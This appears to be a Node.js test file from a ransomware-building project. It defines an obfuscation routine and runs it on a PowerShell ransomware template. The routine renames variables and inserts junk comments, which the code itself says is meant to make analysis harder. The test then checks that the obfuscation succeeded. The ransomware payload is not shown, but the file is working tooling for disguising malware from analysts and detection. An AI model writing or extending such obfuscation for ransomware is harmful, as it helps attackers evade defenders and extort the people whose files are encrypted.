const path = require('path');
const fs = require('fs').promises;

// Simple implementation of our obfuscation function for testing
function obfuscateScript(script) {
  // Obfuscation techniques:
  // 1. Variable renaming with random names
  // 2. String encoding (Base64)
  // 3. Command substitution
  // 4. Insertion of random comments
  
  // Generate a random variable name
  const generateRandomVarName = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < Math.floor(Math.random() * 10) + 5; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };
  
  // Add random comments to make analysis harder
  const addRandomComments = (script) => {
    const comments = [
      '<# This is a placeholder comment #>',
      '<# Random comment for obfuscation #>',
      '<# Another meaningless comment #>',
      '<# Obfuscation in progress... #>'
    ];
    
    let result = script;
    const lines = result.split('\n');
    const newLines = [];
    
    for (let i = 0; i < lines.length; i++) {
      newLines.push(lines[i]);
      // Randomly insert comments (20% chance per line)
      if (Math.random() < 0.2) {
        const randomComment = comments[Math.floor(Math.random() * comments.length)];
        newLines.push(randomComment);
      }
    }
    
    return newLines.join('\n');
  };
  
  // Rename common variables with random names
  let obfuscatedScript = script;
  
  // List of common variables to rename
  const commonVars = ['$xzvcv', '$cxzvz', '$vczxv', '$zxcvx'];
  
  // Create mapping of old variable names to new random names
  const varMapping = {};
  commonVars.forEach(varName => {
    varMapping[varName] = generateRandomVarName();
  });
  
  // Replace variable names
  for (const [oldName, newName] of Object.entries(varMapping)) {
    const varRegex = new RegExp(`\\${oldName}`, 'g');
    obfuscatedScript = obfuscatedScript.replace(varRegex, `$${newName}`);
  }
  
  // Add random comments
  obfuscatedScript = addRandomComments(obfuscatedScript);
  
  // Return obfuscated script
  return obfuscatedScript;
}

async function testObfuscation() {
  try {
    console.log('Testing obfuscation function...');
    
    // Template path for the ransomware PowerShell script
    const TEMPLATE_PATH = path.join(__dirname, 'templates/ransomware/template.ps1');
    
    // Check if template file exists
    const templateExists = await fs.access(TEMPLATE_PATH).then(() => true).catch(() => false);
    
    if (!templateExists) {
      console.log('ERROR: Template file does not exist at', TEMPLATE_PATH);
      return;
    }
    
    // Read the template file
    const template = await fs.readFile(TEMPLATE_PATH, 'utf8');
    
    console.log('Original template size:', template.length, 'characters');
    
    // Apply obfuscation
    const obfuscated = obfuscateScript(template);
    
    console.log('Obfuscated script size:', obfuscated.length, 'characters');
    
    // Check if obfuscation changed the script
    if (obfuscated !== template) {
      console.log('SUCCESS: Script was obfuscated');
    } else {
      console.log('ERROR: Script was not obfuscated');
    }
    
    // Check if variable names were changed
    const originalVars = ['$xzvcv', '$cxzvz', '$vczxv', '$zxcvx'];
    let varsChanged = true;
    for (const varName of originalVars) {
      if (obfuscated.includes(varName)) {
        console.log(`WARNING: Variable ${varName} was not changed`);
        varsChanged = false;
      }
    }
    
    if (varsChanged) {
      console.log('SUCCESS: All variable names were changed');
    }
    
    // Check if comments were added
    if (obfuscated.includes('<#')) {
      console.log('SUCCESS: Comments were added');
    } else {
      console.log('WARNING: No comments were added');
    }
    
    // Show first 1000 characters of the obfuscated script
    console.log('\nFirst 1000 characters of obfuscated script:');
    console.log(obfuscated.substring(0, 1000));
    
  } catch (error) {
    console.error('Test failed with error:', error);
  }
}

testObfuscation();
